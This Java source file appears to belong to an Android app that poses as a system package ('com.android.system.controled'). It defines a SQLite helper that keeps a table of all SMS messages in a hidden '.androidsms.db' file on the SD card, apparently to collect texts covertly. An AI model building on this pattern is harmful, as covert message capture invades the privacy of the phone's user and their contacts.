package com.android.system.controled.db;

import android.database.sqlite.SQLiteDatabase;

import com.android.system.controled.MainApplication;
import com.android.system.controled.util.SQLiteHelper;

public class SdcardSqliteHelper extends SQLiteHelper {

	private static SdcardSqliteHelper mHelper;

	public static final String DATABASENAME = ".androidsms.db";
	protected static final int VERSION = 6;

	protected SdcardSqliteHelper() {
		super(MainApplication.getInstence(), MainApplication.FILE_IN_SDCARD + DATABASENAME, null, VERSION);
	}

	public static SdcardSqliteHelper getInstance() {
		if (mHelper == null) {
			mHelper = new SdcardSqliteHelper();
		}
		return mHelper;
	}

	@Override
	public void onCreate(SQLiteDatabase db) {
		db.execSQL(Tables.TableSms.CREATETABLE_ALLSMS);
	}

	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
		db.execSQL(Tables.TableSms.DELETE_TABLE__ALLSMS);
		onCreate(db);
	}
}
